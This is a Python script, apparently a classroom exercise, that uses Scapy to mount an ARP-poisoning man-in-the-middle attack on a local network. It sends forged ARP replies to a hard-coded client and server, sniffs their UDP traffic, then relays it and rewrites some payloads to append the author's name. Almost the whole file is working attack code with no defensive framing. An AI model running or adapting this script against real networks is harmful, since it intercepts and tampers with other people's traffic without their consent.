# CREATOR: HASHEM
# Author: Ariel Haser
from scapy import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from scapy.sendrecv import sniff, send

NAME = 'ariel haser'
IP_CLIENT = '192.168.1.18'
IP_SERVER = '192.168.1.33'
MAC_CLIENT = '9C:B7:0D:7E:93:0D'
MAC_SERVER = '0C:9D:92:CC:20:F6'


def server_filter(pack):
    if Raw in pack:
        ans_list = pack[Raw].load.split()
        if len(ans_list) > 1 and ans_list[0].isdigit():
            print('true')
            return True
    return False


def client_and_server_filter(pack):
    if Raw in pack:
        ans_list = pack[Raw].load.split()
        if ans_list[0].isdigit():
            print('true')
            return True
    return False


def poisoning_arp():
    #  in case network get the pc's friend, we activate both bottom lines.
    #  pack_client = sniff(count=1, lfilter=client_filter)
    #  pack_server = sniff(count=1, lfilter=server_filter)
    # create client ARP message
    client_arp = ARP(op=2, psrc=IP_SERVER, hwdst=MAC_CLIENT,
                     pdst=IP_CLIENT) / IP(dst=IP_CLIENT)
    # create server ARP message
    server_arp = ARP(op=2, psrc=IP_CLIENT, hwdst=MAC_SERVER,
                     pdst=IP_SERVER) / IP(dst=IP_SERVER)
    send(client_arp)
    send(server_arp)
    print('ARP complete successfully')


def main():
    poisoning_arp()
    pack_client_rec = sniff(count=1, lfilter=client_and_server_filter)
    if len(pack_client_rec[0][Raw].load.split()) > 1:  # in case we get the server message
        print('activate special case')
        pack_client_sen = IP(src=pack_client_rec[0][IP].src, dst=pack_client_rec[0][IP].dst) / \
                          UDP(dport=pack_client_rec[0][UDP].dport) / \
                          Raw(load=((pack_client_rec[0][Raw].load.decode().split()[0] + " " + NAME).encode()))
        send(pack_client_sen)
        print('sent message to client')
    else:
        #  create the pack for the server
        pack_server_sen = IP(src=pack_client_rec[0][IP].src, dst=pack_client_rec[0][IP].dst)/\
                          UDP(dport=pack_client_rec[0][UDP].dport)/\
                          Raw(load=pack_client_rec[0][Raw].load)
        send(pack_server_sen)
        print('sent message to server')
        #  create the pack for the client
        pack_server_rec = sniff(count=1, lfilter=server_filter)
        pack_client_sen = IP(src=pack_server_rec[0][IP].src, dst=pack_server_rec[0][IP].dst)/\
                          UDP(dport=pack_server_rec[0][UDP].dport)/\
                          Raw(load=((pack_server_rec[0][Raw].load.decode().split()[0] + " " + NAME).encode()))
        send(pack_client_sen)
        print('sent message to client')


if __name__ == '__main__':
    main()

